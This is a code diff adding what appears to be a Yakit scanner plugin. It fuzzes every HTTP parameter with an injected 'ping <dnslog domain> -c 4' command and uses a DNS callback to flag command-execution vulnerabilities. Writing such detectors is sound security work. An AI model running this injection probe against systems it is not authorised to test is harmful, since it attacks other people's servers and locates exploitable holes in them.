@@ -1,0 +1,41 @@
+yakit.AutoInitYakit()
+
+mirrorNewWebsitePathParams = (isHttps, url, req, rsp, body) => {
+    freq = fuzz.HTTPRequest(req, fuzz.https(isHttps))~
+    params = freq.GetCommonParams()
+    wsg = sync.NewSizedWaitGroup(10)
+    for param in params {
+        yakit.Info("正在检测参数: %v",param.Name())
+        wsg.Add()
+        go fn{
+            defer wsg.Done()
+            domain,token,err =risk.NewDNSLogDomain()
+            if err{
+                yakit.Error("%v",err)
+            }
+            command = "ping %s -c 4" % domain
+            rsp,err = param.Fuzz(command).ExecFirst()
+            if err{
+                return
+            }
+            res,err = risk.CheckDNSLogByToken(token, 3)
+            if err{
+                return
+            }
+            if len(res)>0 {
+                risk.NewRisk(url, 
+                    risk.title("目标 `%s` 存在命令执行漏洞" % url),
+                    risk.type("rce"),
+                    risk.request(rsp.RequestRaw),
+                    risk.request(rsp.ResponseRaw),
+                    risk.level("critical"),
+                    risk.payload(command),
+                    risk.parameter(param.Name()),
+                    risk.description("基于ping dnslog检测到目标网站参数存在命令执行漏洞"),
+                    risk.solution("对输入内容检查并进行过滤"),
+                )
+            }
+        }
+    }
+    wsg.Wait()
+}
